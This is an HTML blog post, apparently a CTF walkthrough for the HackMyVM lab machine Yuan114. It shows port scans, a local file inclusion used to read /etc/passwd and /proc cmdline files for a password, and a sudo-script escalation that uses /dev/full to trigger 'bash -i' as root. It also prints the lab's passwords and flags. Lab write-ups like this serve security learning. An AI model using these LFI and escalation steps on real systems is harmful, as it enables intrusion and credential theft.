@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en-US"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Yuan114 - Walkthrough | My Blog</title>
+<meta property="og:title" content="Yuan114 - Walkthrough | My Blog" />
+<meta name="twitter:title" content="Yuan114 - Walkthrough | My Blog" />
+<meta itemprop="name" content="Yuan114 - Walkthrough | My Blog" />
+<meta name="application-name" content="Yuan114 - Walkthrough | My Blog" />
+<meta property="og:site_name" content="My Blog" />
+
+<meta name="description" content="Walkthrough for the Yuan114 machine.">
+<meta itemprop="description" content="Walkthrough for the Yuan114 machine." />
+<meta property="og:description" content="Walkthrough for the Yuan114 machine." />
+<meta name="twitter:description" content="Walkthrough for the Yuan114 machine." />
+
+<meta property="og:locale" content="en-US" />
+<meta name="language" content="en-US" />
+
+  <link rel="alternate" hreflang="en" href="https://nvru.github.io/posts/hmv/yuan114/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-07-08T00:00:00Z />
+    <meta property="article:published_time" content=2026-07-08T00:00:00Z />
+    <meta property="og:url" content="https://nvru.github.io/posts/hmv/yuan114/" />
+
+    
+    <meta property="og:article:author" content="null void root" />
+    <meta property="article:author" content="null void root" />
+    <meta name="author" content="null void root" />
+    
+    
+
+    
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "Yuan114 - Walkthrough",
+        "author": {
+        "@type": "Person",
+        "name": "null void root"
+        },
+        "datePublished": "2026-07-08",
+        "description": "Walkthrough for the Yuan114 machine.",
+        "wordCount":  564 ,
+        "mainEntityOfPage": "https://nvru.github.io/posts/hmv/yuan114/",
+        "dateModified": "2026-07-08",
+        "image": {
+        "@type": "ImageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "My Blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.163.3">
+
+    
+    <meta property="og:url" content="https://nvru.github.io/posts/hmv/yuan114/">
+	<meta property="og:site_name" content="My Blog">
+	<meta property="og:title" content="Yuan114 - Walkthrough">
+	<meta property="og:description" content="Walkthrough for the Yuan114 machine.">
+	<meta property="og:locale" content="en_US">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-07-08T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-07-08T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Walkthrough">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Apache">
+		<meta property="article:tag" content="Lfi">
+		<meta property="article:tag" content="Procfs">
+
+
+    
+    
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Yuan114 - Walkthrough">
+	<meta name="twitter:description" content="Walkthrough for the Yuan114 machine.">
+
+
+    
+
+    <link rel="canonical" href="https://nvru.github.io/posts/hmv/yuan114/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://nvru.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://nvru.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Yuan114 - Walkthrough</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-07-08T00:00:00&#43;00:00" itemprop="datePublished"> 8 Jul 2026 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#port-scanning">Port Scanning</a>
+      <ul>
+        <li><a href="#rustscan">RustScan</a></li>
+        <li><a href="#results">Results</a></li>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#results-1">Results</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#http-port-80">HTTP (Port 80)</a></li>
+    <li><a href="#directory-enumeration">Directory Enumeration</a></li>
+    <li><a href="#local-file-inclusion">Local File Inclusion</a></li>
+    <li><a href="#system-enumeration-through-lfi">System Enumeration Through LFI</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#sudo-enumeration">sudo Enumeration</a></li>
+    <li><a href="#script-analysis">Script Analysis</a></li>
+    <li><a href="#exploiting-the-script">Exploiting the Script</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#user-flag">User Flag</a></li>
+    <li><a href="#root-flag">Root Flag</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="overview">Overview</h2>
+<ul>
+<li><strong>Attacker IP:</strong> <code>10.10.10.2</code></li>
+<li><strong>Target Machine IP:</strong> <code>10.10.10.16</code></li>
+</ul>
+<p>The objective was to enumerate the target, identify exposed services, exploit a Local File Inclusion vulnerability to obtain credentials, gain SSH access, and escalate privileges through a vulnerable sudo script.</p>
+<p><img src="/images/hmv/yuan114/vm.png" alt="Machine information"></p>
+<hr>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="rustscan">RustScan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.10.10.16 -- -A -oA nmap/rust
+</span></span></code></pre></div><h3 id="results">Results</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Open 10.10.10.16:22
+</span></span><span style="display:flex;"><span>Open 10.10.10.16:80
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span></code></pre></div><hr>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sSCV -A -p22,80 10.10.10.16 -oA nmap/22_80 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span>
+</span></span></code></pre></div><h3 id="results-1">Results</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service Info:
+</span></span><span style="display:flex;"><span>OS: Linux
+</span></span></code></pre></div><p>Only SSH and HTTP were exposed, so I focused on web enumeration first.</p>
+<hr>
+<h1 id="web-enumeration">Web Enumeration</h1>
+<h2 id="http-port-80">HTTP (Port 80)</h2>
+<p>Browsing to port 80 revealed a default Apache page with no useful functionality.</p>
+<p><img src="/images/hmv/yuan114/http.png" alt="HTTP homepage"></p>
+<p>Inspecting the page source also revealed nothing interesting, so I moved on to directory enumeration.</p>
+<hr>
+<h2 id="directory-enumeration">Directory Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-u http://10.10.10.16/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-w /opt/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-x html,php,js,txt,xml,sql,bak,wav,jpg,jpeg,png
+</span></span></code></pre></div><p>The scan revealed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/file.php
+</span></span></code></pre></div><p>The page returned <strong>HTTP 500</strong>, which suggested it might process input internally.</p>
+<p><img src="/images/hmv/yuan114/found_filephp.png" alt="Discovered file.php"></p>
+<hr>
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
+<p>Since <code>file.php</code> appeared to load files, I attempted to identify the required parameter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-u <span style="color:#e6db74">&#34;http://10.10.10.16/file.php?FUZZ=/etc/passwd&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-w /opt/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-fs <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>The vulnerable parameter was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>file
+</span></span></code></pre></div><p>The application allowed arbitrary file reads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/file.php?file=/etc/passwd
+</span></span></code></pre></div><p>The passwd file revealed a local user:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>welcome
+</span></span></code></pre></div><hr>
+<h2 id="system-enumeration-through-lfi">System Enumeration Through LFI</h2>
+<p>Reading normal files did not immediately provide credentials.</p>
+<p><img src="/images/hmv/yuan114/etc_passwd.png" alt="Contents of /etc/passwd"></p>
+<p>I attempted to access SSH keys from the user&rsquo;s home directory, but no useful information was obtained.</p>
+<p>Because the vulnerability allowed arbitrary file reads, I started checking the <code>/proc</code> filesystem.</p>
+<p>The <code>/proc</code> filesystem contains runtime information about running processes, including command-line arguments. Sensitive information such as passwords or tokens can sometimes appear there.</p>
+<p>Using the LFI vulnerability, I enumerated process command lines:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..1000<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    curl -s <span style="color:#e6db74">&#34;http://10.10.10.16/file.php?file=/proc/</span>$i<span style="color:#e6db74">/cmdline&#34;</span> | strings
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>A process command line exposed the user&rsquo;s password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>6WXqj9Vc2tdXQ3TN0z54
+</span></span></code></pre></div><p><img src="/images/hmv/yuan114/found_user_passwd.png" alt="Recovered password"></p>
+<hr>
+<h1 id="initial-access">Initial Access</h1>
+<p>Using the recovered credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Username: welcome
+</span></span><span style="display:flex;"><span>Password: 6WXqj9Vc2tdXQ3TN0z54
+</span></span></code></pre></div><p>SSH access was successful.</p>
+<p><img src="/images/hmv/yuan114/ssh_as_welcome.png" alt="SSH as welcome"></p>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="sudo-enumeration">sudo Enumeration</h2>
+<p>The first thing I checked was sudo permissions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p>The user could execute the following scripts as root without a password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/opt/read.sh
+</span></span><span style="display:flex;"><span>/opt/short.sh
+</span></span></code></pre></div><p><img src="/images/hmv/yuan114/sudo_l.png" alt="sudo permissions"></p>
+<p>The scripts were not writable, so I checked the source code.</p>
+<hr>
+<h2 id="script-analysis">Script Analysis</h2>
+<p><img src="/images/hmv/yuan114/src.png" alt="Script source"></p>
+<p>The script uses:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>My_guess<span style="color:#f92672">=</span>$RANDOM
+</span></span></code></pre></div><p>I was not familiar with <code>$RANDOM</code> at first and assumed it was related to a process ID. If that was the case, brute-forcing it would not be practical.</p>
+<p><img src="/images/hmv/yuan114/maybe_pcid.png" alt="Test short.sh"></p>
+<p>Looking at the last line:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span>$My_guess<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Nop&#34;</span> <span style="color:#f92672">||</span> bash -i
+</span></span></code></pre></div><p>it is just another way of writing the <code>if</code> statement above it.</p>
+<p>The interesting part is the <code>echo</code> command. If <code>echo</code> fails, the <code>||</code> condition is triggered and the script executes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -i
+</span></span></code></pre></div><p>So instead of guessing the random value, the goal is to make <code>echo</code> fail.</p>
+<hr>
+<h2 id="exploiting-the-script">Exploiting the Script</h2>
+<p>I used <code>/dev/full</code> to force the output operation to fail.</p>
+<p>Unlike <code>/dev/null</code>, which discards output normally, <code>/dev/full</code> returns an error whenever something is written to it.</p>
+<p>Reference:</p>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki//dev/full">https://en.wikipedia.org/wiki//dev/full</a></li>
+</ul>
+<p>By redirecting the output to <code>/dev/full</code>, <code>echo</code> fails and the script executes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -i
+</span></span></code></pre></div><p>giving a root shell.</p>
+<p><img src="/images/hmv/yuan114/exploit.png" alt="Exploit"></p>
+<p>The shell worked, but commands like <code>id</code> did not show any output because stdout was still redirected.</p>
+<p>Redirecting stdout back to the terminal fixed it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exec 1&gt;/dev/tty
+</span></span></code></pre></div><p><img src="/images/hmv/yuan114/fix_op.png" alt="Output restored"></p>
+<p>After restoring the output, the root shell was fully usable and the flags and credentials were collected.</p>
+<hr>
+<h1 id="credentials">Credentials</h1>
+<p><img src="/images/hmv/yuan114/flags_passwd.png" alt="Flags and passwords"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>welcome:6WXqj9Vc2tdXQ3TN0z54
+</span></span><span style="display:flex;"><span>root:6aq56zxVseLt7oApVBc1
+</span></span></code></pre></div><hr>
+<h1 id="flags">Flags</h1>
+<h2 id="user-flag">User Flag</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>flag{user-210f652e7e3b7e7359e523ef04e96295}
+</span></span></code></pre></div><h2 id="root-flag">Root Flag</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>flag{root-c3dbe270140775bb9fc6eaa2559f914f}
+</span></span></code></pre></div>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://codeberg.org/vru" target="_blank" rel="noopener noreferrer me"
+    title="Codeberg">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+ <g transform="translate(2.4, 2.4) scale(0.8)">
+  <path d="M11.955.49A12 12 0 0 0 0 12.49a12 12 0 0 0 1.832 6.373L11.838 5.928a.187.14 0 0 1 .324 0l10.006 12.935A12 12 0 0 0 24 12.49a12 12 0 0 0-12-12 12 12 0 0 0-.045 0zm.375 6.467 4.416 16.553a12 12 0 0 0 5.137-4.213z"/>
+ </g>
+</svg>
+</a>
+<a href="https://github.com/nvru" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://linkedin.com/in/abdullah-keitut-880a09385" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2026 null void root.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://nvru.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
